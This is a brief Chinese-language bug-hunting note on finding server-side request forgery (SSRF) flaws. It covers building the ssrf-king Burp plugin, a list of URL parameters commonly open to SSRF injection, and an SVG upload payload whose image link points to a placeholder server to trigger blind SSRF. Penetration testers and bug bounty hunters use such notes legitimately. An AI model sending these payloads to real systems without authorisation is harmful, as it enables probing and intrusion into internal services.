# SSRF 漏洞挖掘技巧

## 0x1 自动化挖掘SSRF

### 0x1.1 组合思路

![Et9d-mlXYAE7cg0](常用的SSRF参数.assets/Et9d-mlXYAE7cg0-3134197.jpeg)

### 1.2 burp插件SSRF-king

```
git clone https://github.com/ethicalhackingplayground/ssrf-king
gradle build
```

> 自动使用burpcollaborator来进行探测非常方便

介绍链接:https://www.kitploit.com/2021/01/ssrf-king-ssrf-plugin-for-burp.html?utm_source=dlvr.it&utm_medium=twitter





## 常用的SSRF参数

```
?url=[SSRF]
?q=[SSRF]
?u=[SSRF]
?link=[SSRF]
?host=[SSRF]
?file=[SSRF]
?path=[SSRF]
?imgurl=[SSRF]
?src=[SSRF]
?consumerUri=[SSRF]
```



##  挖掘SSRF一些技巧

### svg服务端图片处理导致的盲ssrf

Content-Type: image/svg+xml

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>
```

利用参考:https://hackerone.com/reports/223203

